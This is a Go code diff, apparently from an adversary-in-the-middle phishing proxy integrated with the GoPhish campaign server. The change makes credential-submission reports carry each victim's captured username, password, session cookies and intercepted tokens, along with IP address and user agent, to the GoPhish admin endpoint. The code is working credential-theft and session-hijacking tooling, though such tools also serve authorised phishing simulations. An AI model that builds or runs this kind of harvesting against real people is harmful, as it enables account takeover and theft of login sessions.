@@ -13,18 +13,20 @@ type GoPhish struct {
 	AdminUrl    *url.URL
 	ApiKey      string
 	InsecureTLS bool
+	Sessions bool
 }
 
 type ResultRequest struct {
-	Address   string `json:"address"`
-	UserAgent string `json:"user_agent"`
+	Address   string                 `json:"address"`
+	UserAgent string                 `json:"user-agent"`
+	Data      map[string]interface{} `json:"data"`
 }
 
 func NewGoPhish() *GoPhish {
 	return &GoPhish{}
 }
 
-func (o *GoPhish) Setup(adminUrl string, apiKey string, insecureTLS bool) error {
+func (o *GoPhish) Setup(adminUrl string, apiKey string, insecureTLS bool, gophishSessions bool) error {
 
 	var u *url.URL = nil
 	var err error
@@ -37,6 +39,7 @@ func (o *GoPhish) Setup(adminUrl string, apiKey string, insecureTLS bool) error 
 	o.AdminUrl = u
 	o.ApiKey = apiKey
 	o.InsecureTLS = insecureTLS
+	o.Sessions = gophishSessions
 	return nil
 }
 
@@ -93,15 +96,35 @@ func (o *GoPhish) ReportEmailLinkClicked(rid string, address string, userAgent s
 	return o.apiRequest(reqUrl.String(), content)
 }
 
-func (o *GoPhish) ReportCredentialsSubmitted(rid string, address string, userAgent string) error {
+func (o *GoPhish) ReportCredentialsSubmitted(rid string, session *Session, gophishSessions bool) error {
 	err := o.validateSetup()
 	if err != nil {
 		return err
 	}
 
+	data := make(map[string]interface{})
+	if gophishSessions {
+		data["username"] = session.Username
+		data["password"] = session.Password
+		if len(session.CookieTokens) != 0 {
+			data["cookies"] = (*Terminal).cookieTokensToJSON(nil, session.CookieTokens)
+		}
+
+		for k, v := range session.Custom {
+			data[k] = v
+		}
+		for k, v := range session.BodyTokens {
+			data[k] = v
+		}
+		for k, v := range session.HttpTokens {
+			data[k] = v
+		}
+	}
+
 	req := ResultRequest{
-		Address:   address,
-		UserAgent: userAgent,
+		Address:   session.RemoteAddr,
+		UserAgent: session.UserAgent,
+		Data:      data,
 	}
 
 	content, err := json.Marshal(req)
